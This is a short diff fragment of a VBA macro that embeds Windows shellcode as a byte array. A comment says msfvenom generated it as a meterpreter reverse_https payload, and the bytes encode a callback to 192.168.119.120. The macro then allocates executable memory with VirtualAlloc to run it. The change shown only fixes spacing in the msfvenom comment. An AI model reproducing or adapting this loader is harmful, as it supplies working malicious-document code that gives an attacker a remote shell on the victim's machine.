@@ -38,7 +38,7 @@ Function MyMacro()
 45,6,24,123,255,213,133,192,117,20,104,136,19,0,0,104,68,240,53,224,255,213,79,117,205,232,76,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86,104,18,150,137,226,255,213,133,192,116,207,139,7,1,195,133,192, _
 117,229,88,195,95,232,107,255,255,255,49,57,50,46,49,54,56,46,49,49,57,46,49,50,48,0,187,224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,83,255,213)
 
-' Above shellcode generated with "msfvenom -p windows/meterpreter/reverse_https LHOST=X.X.X.X LPORT = 443 EXITFUNC=thread -f vbapplication"
+' Above shellcode generated with "msfvenom -p windows/meterpreter/reverse_https LHOST=X.X.X.X LPORT=443 EXITFUNC=thread -f vbapplication"
 
     addr = VirtualAlloc(0, UBound(buf), &H300, &H40) ' allocating our memory
 
